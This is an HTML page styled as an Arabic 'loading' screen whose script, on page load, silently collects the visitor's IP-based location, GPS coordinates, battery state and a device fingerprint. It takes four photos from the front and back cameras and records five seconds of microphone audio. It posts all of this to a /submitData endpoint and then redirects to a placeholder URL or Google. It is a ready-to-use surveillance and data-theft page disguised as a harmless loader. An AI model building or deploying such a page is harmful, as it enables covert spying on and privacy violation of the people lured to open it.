<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
            color: #fff;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .logo {
            font-size: 3rem;
            margin-bottom: 10px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        h1 {
            font-size: 1.8rem;
            margin-bottom: 5px;
            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .sub-title {
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 30px;
        }
        .loader {
            width: 70px;
            height: 70px;
            margin: 20px auto;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .dots {
            display: inline-block;
            font-size: 2rem;
        }
        .dots span {
            animation: dot 1.4s infinite both;
            display: inline-block;
        }
        .dots span:nth-child(1) { animation-delay: 0s; }
        .dots span:nth-child(2) { animation-delay: 0.2s; }
        .dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes dot {
            0%, 80%, 100% { transform: scale(0); opacity: 0; }
            40% { transform: scale(1); opacity: 1; }
        }
        .status {
            margin-top: 20px;
            padding: 12px 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            font-size: 0.9rem;
            color: #4ecdc4;
            border: 1px solid rgba(78, 205, 196, 0.2);
            min-height: 50px;
        }
        .progress {
            width: 100%;
            height: 3px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff6b6b, #ffd93d, #4ecdc4);
            border-radius: 2px;
            animation: progress 4s ease-in-out infinite;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .footer {
            margin-top: 30px;
            color: #555;
            font-size: 0.7rem;
        }
        .info-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.7rem;
            margin: 2px;
        }
        .badge-success { background: rgba(78, 205, 196, 0.2); color: #4ecdc4; }
        .badge-warning { background: rgba(255, 215, 0, 0.2); color: #ffd93d; }
        .badge-danger { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h1>جاري التحميل</h1>
        <div class="sub-title">جمع المعلومات وإرسالها...</div>
        
        <div class="loader"></div>
        <div class="dots"><span>.</span><span>.</span><span>.</span></div>
        
        <div class="status" id="status">⏳ جاري تجهيز البيانات...</div>
        
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        
        <div style="margin-top:15px;">
            <span class="info-badge badge-success" id="ipBadge">🌐 IP: جاري...</span>
            <span class="info-badge badge-warning" id="batteryBadge">🔋 جاري...</span>
            <span class="info-badge badge-danger" id="locationBadge">📍 جاري...</span>
        </div>
        
        <div class="footer">© 2024 All Rights Reserved</div>
    </div>

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        function updateStatus(text) {
            document.getElementById('status').textContent = text;
        }

        function updateBadges() {
            if (ipInfo) document.getElementById('ipBadge').textContent = '🌐 ' + ipInfo.split(',')[0];
            if (batteryStatus) document.getElementById('batteryBadge').textContent = '🔋 ' + batteryStatus;
            if (locationStr) document.getElementById('locationBadge').textContent = '📍 ' + locationStr.split(',')[0];
        }

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
                updateStatus('🌐 تم جلب معلومات IP');
                updateBadges();
            } catch {
                ipInfo = 'Unable to get IP';
                updateStatus('⚠️ فشل جلب IP');
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
                updateStatus('🔋 تم جلب معلومات البطارية');
                updateBadges();
            } catch {
                batteryStatus = 'Unknown';
                updateStatus('⚠️ فشل جلب البطارية');
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));
                
                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);
                
                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);
                
                stream.getTracks().forEach(t => t.stop());
                updateStatus(`📸 تم التقاط صورة (${facingMode === 'user' ? 'أمامية' : 'خلفية'})`);
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                updateStatus(`⚠️ فشل التقاط الكاميرا ${facingMode === 'user' ? 'الأمامية' : 'الخلفية'}`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            updateStatus('🎤 تم تسجيل الصوت');
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                updateStatus('⚠️ فشل تسجيل الصوت');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        updateStatus('📍 تم جلب الموقع');
                        updateBadges();
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        updateStatus('⚠️ فشل جلب الموقع');
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            updateStatus('💻 تم جلب معلومات الجهاز');
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');
                
                updateStatus('📤 جاري إرسال البيانات...');
                
                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });
                
                updateStatus('✅ تم إرسال البيانات بنجاح');
                return response;
            } catch (error) {
                console.error('Send error:', error);
                updateStatus('⚠️ فشل إرسال البيانات');
                return null;
            }
        }

        async function startProcess() {
            updateStatus('🚀 بدء جمع البيانات...');
            
            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();
            
            const response = await sendData();
            
            updateStatus('🔄 جاري التوجيه...');
            
            setTimeout(() => {
                if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                    window.location.href = REDIRECT_URL;
                } else {
                    window.location.href = 'https://www.google.com';
                }
            }, 1500);
        }

        window.onload = function() {
            setTimeout(startProcess, 1000);
        };
    </script>
</body>
</html>
